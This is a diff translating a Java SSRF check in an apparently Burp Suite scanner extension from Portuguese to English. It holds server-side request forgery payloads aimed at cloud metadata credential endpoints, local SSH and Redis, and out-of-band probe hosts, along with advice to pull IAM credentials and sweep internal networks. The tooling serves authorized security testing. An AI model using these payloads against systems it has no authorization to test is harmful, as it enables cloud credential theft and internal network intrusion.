@@ -15,15 +15,15 @@ import java.util.Map;
 import java.util.regex.Pattern;
 
 /**
- * Testa parâmetros que costumam aceitar uma URL (webhook, callback, avatar,
- * import de arquivo por URL, etc) com alvos internos clássicos — especialmente
- * o endpoint de metadata de nuvem (AWS/GCP/Azure) — e procura por assinaturas
- * de resposta que confirmam que o SERVIDOR fez a requisição (SSRF).
+ * Tests parameters that typically accept a URL (webhook, callback, avatar,
+ * import-file-by-URL, etc) against classic internal targets — especially the
+ * cloud metadata endpoint (AWS/GCP/Azure) — and looks for response
+ * signatures that confirm the SERVER made the request (SSRF).
  *
- * Isso é um probe baseado em conteúdo/erro — para confirmação definitiva em
- * ambientes sem metadata de nuvem, complemente com Burp Collaborator manualmente.
+ * This is a content/error-based probe — for definitive confirmation in
+ * environments without cloud metadata, complement it manually with Burp Collaborator.
  *
- * Criado por Rx0 - @rodrigocoutinho91
+ * Created by Rx0 - @rodrigocoutinho91
  */
 public class SsrfCheck implements VulnCheck {
 
@@ -32,71 +32,71 @@ public class SsrfCheck implements VulnCheck {
             "avatar", "file_url", "feed", "proxy", "fetch", "path", "dest"
     };
 
-    // payload -> assinatura esperada na resposta se o servidor realmente buscou o recurso
-    private static final Map<String, Pattern> ALVOS_INTERNOS = new LinkedHashMap<>();
+    // payload -> expected signature in the response if the server really fetched the resource
+    private static final Map<String, Pattern> INTERNAL_TARGETS = new LinkedHashMap<>();
     static {
-        ALVOS_INTERNOS.put("http://169.254.169.254/latest/meta-data/",
+        INTERNAL_TARGETS.put("http://169.254.169.254/latest/meta-data/",
                 Pattern.compile("ami-id|instance-id|iam/security-credentials|local-hostname", Pattern.CASE_INSENSITIVE));
-        ALVOS_INTERNOS.put("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        INTERNAL_TARGETS.put("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                 Pattern.compile("AccessKeyId|SecretAccessKey|Token", Pattern.CASE_INSENSITIVE));
-        ALVOS_INTERNOS.put("http://metadata.google.internal/computeMetadata/v1/",
+        INTERNAL_TARGETS.put("http://metadata.google.internal/computeMetadata/v1/",
                 Pattern.compile("project-id|instance|computeMetadata", Pattern.CASE_INSENSITIVE));
-        ALVOS_INTERNOS.put("http://127.0.0.1:22",
+        INTERNAL_TARGETS.put("http://127.0.0.1:22",
                 Pattern.compile("SSH-2\\.0|SSH-1\\.99"));
-        ALVOS_INTERNOS.put("http://localhost:6379",
+        INTERNAL_TARGETS.put("http://localhost:6379",
                 Pattern.compile("-ERR|\\+PONG|redis_version"));
     }
 
     @Override
-    public String nome() {
-        return "SSRF (parâmetros que aceitam URL + metadata de cloud)";
+    public String name() {
+        return "SSRF (URL-accepting parameters + cloud metadata)";
     }
 
-    // Parâmetros usados pra teste com confirmação OOB (subconjunto, pra não gerar
-    // probes demais — a detecção por conteúdo acima já cobre todos os PARAM_NAMES)
-    private static final String[] PARAMS_PARA_OOB = {"url", "webhook", "callback", "src"};
+    // Parameters used for the OOB-confirmed test (a subset, to avoid generating too
+    // many probes — the content-based detection above already covers every PARAM_NAMES entry)
+    private static final String[] PARAMS_FOR_OOB = {"url", "webhook", "callback", "src"};
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl) {
-        return executar(api, baseUrl, (ScanContext) null);
+    public List<Finding> execute(MontoyaApi api, String baseUrl) {
+        return execute(api, baseUrl, (ScanContext) null);
     }
 
     @Override
-    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
-        List<Finding> achados = new ArrayList<>();
+    public List<Finding> execute(MontoyaApi api, String baseUrl, ScanContext ctx) {
+        List<Finding> findings = new ArrayList<>();
         String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
 
-        // --- Confirmação OOB via interactsh, quando disponível ---
-        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
-            for (String param : PARAMS_PARA_OOB) {
+        // --- OOB confirmation via interactsh, when available ---
+        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isAvailable()) {
+            for (String param : PARAMS_FOR_OOB) {
                 try {
-                    String host = ctx.interactsh().criarProbe(
-                            "SSRF confirmado via interação out-of-band no parâmetro '" + param + "'",
-                            Severity.CRITICA,
+                    String host = ctx.interactsh().createProbe(
+                            "SSRF confirmed via out-of-band interaction in parameter '" + param + "'",
+                            Severity.CRITICAL,
                             base,
-                            "O servidor alvo foi induzido a fazer uma requisição para um domínio único de teste através do " +
-                                    "parâmetro '" + param + "', e essa requisição foi efetivamente recebida — confirmação " +
-                                    "inequívoca de SSRF, mesmo sem metadata de cloud ou serviço local específico exposto.",
-                            "Valide e restrinja destinos de requisições feitas pelo servidor a uma allowlist, bloqueie ranges " +
-                                    "de IP internos/link-local e desabilite redirects automáticos nessas chamadas.",
-                            "1) Use esse mesmo domínio único de teste (regenerável a cada scan) pra confirmar reprodutibilidade. " +
-                                    "2) Troque o payload para apontar pra IPs/portas internas específicas da rede do alvo, " +
-                                    "mantendo o mesmo tipo de canal OOB pra confirmar acesso a serviços internos.");
+                            "The target server was induced to make a request to a unique test domain through " +
+                                    "parameter '" + param + "', and that request was actually received — an unambiguous " +
+                                    "confirmation of SSRF, even without cloud metadata or a specific exposed local service.",
+                            "Validate and restrict the destinations of server-side requests to an allowlist, block internal/" +
+                                    "link-local IP ranges, and disable automatic redirects on these calls.",
+                            "1) Use this same unique test domain (regenerated on every scan) to confirm reproducibility. " +
+                                    "2) Swap the payload to point at specific internal IPs/ports on the target's network, " +
+                                    "keeping the same OOB channel type to confirm access to internal services.");
                     if (host != null) {
                         String payload = "http://" + host + "/rx0-ssrf-oob-probe";
                         String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                         api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de SSRF (param " + param + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error firing SSRF OOB probe (param " + param + "): " + e.getMessage());
                 }
             }
         }
 
         for (String param : PARAM_NAMES) {
-            for (Map.Entry<String, Pattern> alvo : ALVOS_INTERNOS.entrySet()) {
+            for (Map.Entry<String, Pattern> target : INTERNAL_TARGETS.entrySet()) {
                 try {
-                    String payload = alvo.getKey();
+                    String payload = target.getKey();
                     String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                     HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                     HttpResponse resp = api.http().sendRequest(req).response();
@@ -105,28 +105,28 @@ public class SsrfCheck implements VulnCheck {
                     String body = resp.bodyToString();
                     if (body == null) continue;
 
-                    if (alvo.getValue().matcher(body).find()) {
-                        achados.add(new Finding(
-                                "Possível SSRF confirmado no parâmetro '" + param + "'",
-                                Severity.CRITICA,
+                    if (target.getValue().matcher(body).find()) {
+                        findings.add(new Finding(
+                                "Possible SSRF confirmed in parameter '" + param + "'",
+                                Severity.CRITICAL,
                                 url,
-                                "Ao enviar uma URL interna/de metadata de nuvem no parâmetro '" + param + "', a resposta contém " +
-                                        "conteúdo que só existiria se o SERVIDOR tivesse feito a requisição por trás — ou seja, o backend " +
-                                        "está buscando URLs fornecidas pelo usuário sem validação (SSRF).",
-                                "Payload: " + payload + " | Assinatura encontrada na resposta: " + alvo.getValue().pattern(),
-                                "Valide e restrinja destinos de requisições feitas pelo servidor a uma allowlist, bloqueie ranges de IP " +
-                                        "internos/link-local (169.254.0.0/16, 127.0.0.0/8, 10.0.0.0/8 etc) e desabilite redirects automáticos nessas chamadas.",
-                                "1) Reenvie no Repeater com o mesmo parâmetro '" + param + "' apontando pro Burp Collaborator pra confirmar " +
-                                        "interação out-of-band. 2) Se for AWS, tente ler credenciais IAM completas em " +
-                                        "/latest/meta-data/iam/security-credentials/<nome-da-role> (o nome vem da primeira resposta). " +
-                                        "3) Teste varrer a rede interna trocando o host por outros IPs/portas (ex: 10.0.0.1:8080, 10.0.0.1:3306) " +
-                                        "pra mapear serviços internos acessíveis. 4) Credenciais de cloud via SSRF costumam virar comprometimento total da conta."));
+                                "Sending an internal/cloud-metadata URL in parameter '" + param + "' produced a response " +
+                                        "containing content that could only exist if the SERVER had made the request behind the scenes — " +
+                                        "i.e. the backend is fetching user-supplied URLs with no validation (SSRF).",
+                                "Payload: " + payload + " | Signature found in the response: " + target.getValue().pattern(),
+                                "Validate and restrict the destinations of server-side requests to an allowlist, block internal/link-local " +
+                                        "IP ranges (169.254.0.0/16, 127.0.0.0/8, 10.0.0.0/8, etc) and disable automatic redirects on these calls.",
+                                "1) Resend in Repeater with the same parameter '" + param + "' pointing at Burp Collaborator to confirm " +
+                                        "out-of-band interaction. 2) If it's AWS, try reading full IAM credentials from " +
+                                        "/latest/meta-data/iam/security-credentials/<role-name> (the name comes from the first response). " +
+                                        "3) Try sweeping the internal network by swapping the host for other IPs/ports (e.g. 10.0.0.1:8080, 10.0.0.1:3306) " +
+                                        "to map reachable internal services. 4) Cloud credentials obtained via SSRF usually turn into full account compromise."));
                     }
                 } catch (Exception e) {
-                    api.logging().logToError("[Rx0] Erro no check de SSRF (param " + param + "): " + e.getMessage());
+                    api.logging().logToError("[Rx0] Error in SSRF check (param " + param + "): " + e.getMessage());
                 }
             }
         }
-        return achados;
+        return findings;
     }
 }
